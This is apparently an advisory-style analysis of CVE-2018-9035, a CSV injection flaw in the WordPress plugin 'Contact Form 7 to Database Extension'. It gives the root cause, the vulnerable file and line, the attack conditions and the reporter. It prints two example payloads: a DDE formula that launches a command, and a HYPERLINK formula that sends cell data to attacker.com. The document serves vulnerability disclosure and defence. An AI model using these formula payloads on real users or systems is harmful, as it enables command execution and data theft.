Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2018-9035

**Root Cause:**
The vulnerability stems from a lack of proper sanitization of user-supplied data before it's written to a CSV file. Specifically, the plugin doesn't escape or sanitize spreadsheet formulas (strings starting with '=') within the exported CSV data.

**Weaknesses/Vulnerabilities:**
- CSV Injection: The plugin is vulnerable to CSV injection because it directly prints values from a column, which could contain spreadsheet formulas, without checking or escaping them.

**Impact of Exploitation:**
- Remote Code Execution (Potential): By injecting malicious formulas like `=cmd|'/C calc.exe'!Z0`, an attacker could potentially achieve remote code execution on the client's machine if the user opens the manipulated CSV file.
- Data Leakage: Using formulas like `=HYPERLINK("http://attacker.com/leak?="&A1&A2, "Click to load more data!")`, an attacker could redirect the user to a malicious website and potentially steal data from the user's spreadsheet.

**Attack Vectors:**
- The attacker injects a malicious formula into any of the contact form fields available.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to submit data via the contact form which is saved by the plugin.
- The attacker does not need to be authenticated to exploit the vulnerability in this context.
- The vulnerability is triggered when an administrator exports the log containing the malicious formula as a CSV file and opens the file.

**Additional Details:**
- The vulnerable plugin is "Contact Form 7 to Database Extension" version 2.10.32.
- The vulnerability exists in `contact-form-7-to-database-extension/ExportToCsvUtf8.php` on line 135.
- The plugin was discontinued on November 28, 2017.
- The plugin had over 400,000 active installations at the time the vulnerability was discovered.
- The exploit was reported by Stefan Broeder on 2018-03-23.
